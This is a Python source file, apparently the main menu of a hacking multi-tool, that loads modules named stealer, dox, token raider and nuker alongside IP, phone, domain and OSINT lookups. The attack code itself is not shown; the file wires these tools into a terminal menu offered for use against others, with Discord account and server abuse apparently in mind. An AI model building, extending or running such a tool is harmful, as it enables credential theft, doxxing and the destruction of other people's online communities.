
import util
from util import utils
from util.program import *
import asyncio
import util.program
import util.program.stealer
import random
from util import config
import os
from util.config import requirements
import keyboard



def ostype():
     if config.os_name == 'Windows':
          return 'cls'

     elif config.os_name == 'Linux':
          return 'clear'
     else:
          return None
     
clear = ostype()

def f11():
     os.system(clear)
     ask1 = input('do you want to activate full screen mode for a better display of ascii [Y/N]')
     if ask1 == 'Y':
          keyboard.press_and_release('f11')
     else : 
          pass
f11()

def install():
     os.system(clear)
     ask1 = input('DO YOU WANT TO INSTALL REQUIREMENTS [Y/N]')
     
     if ask1 == 'Y':
          config.requirements()
     else :
          pass
install()






bannerwx = [utils.banner, utils.banner2, utils.banner3, utils.banner4]
bannerrr = random.choice(bannerwx)



while True:

    async def menu():

            os.system(clear)
            print(utils.red + bannerrr)


            choice = input(f"""{utils.red}┌───({utils.reset}{utils.hostname}@a0ri{utils.red})─[{utils.reset}${utils.red}]
└──{utils.reset}$ {utils.reset}""")
            


            if choice =='1':
                os.system(clear)
                from util.program.iplookup import iplookup
                await iplookup()

                input(f'\n{utils.blue}press enter to exit')

            elif choice == '2':
                 os.system(clear)
                 from util.program.stealer import stealer
                 await stealer()
                 input(f'\n{utils.blue}press enter to exit')

            elif choice == '3':
                 os.system(clear)
                 from util.program.searcher import searcher
                 await searcher()
                 input(f'\n{utils.blue}press enter to exit')
            
            elif choice == '4':
                 os.system(clear)
                 from util.program.phonelookup import phonelookup
                 await phonelookup()
                 input(f'\n{utils.blue}press enter to exit')
                
            elif choice == '5':
                 os.system(clear)
                 from util.program.osint import osint
                 await osint()
                 input(f'\n{utils.blue}press enter to exit')

            elif choice == '6':
                 os.system(clear)
                 from util.program.domainlookup import domainlookup
                 await domainlookup()
                 input(f'\n{utils.blue}press enter to exit')

            elif choice == '7':
                 os.system(clear)
                 from util.program.hypesquadchanger import hypesquadchanger
                 await hypesquadchanger()
                 input(f'\n{utils.blue}press enter to exit')

            elif choice == '8':
                 os.system(clear)
                 from util.program.dox import dox
                 await dox()
                 input(f'\n{utils.blue}press enter to exit')
               
            elif choice == '9':
                 os.system(clear)
                 from util.program.raid import token_raid
                 await token_raid().raider()
                 input(f'\n{utils.blue}press enter to exit')
               
            elif choice == '10':
                 os.system(clear)
                 utils.os.system('cls')
                 from util.program.nuker import nuke
                 await nuke()
                 input(f'\n{utils.blue}press enter to exit')



            elif choice == '0':
                 os.system(clear)
                 from util.program.latest import latest
                 await latest()
                 input(f'\n{utils.blue}press enter to exit')
                 
            else:
                 print(f'{utils.red}[+] INVALID CHOICE')
                 utils.time.sleep(2)


    asyncio.run(menu())
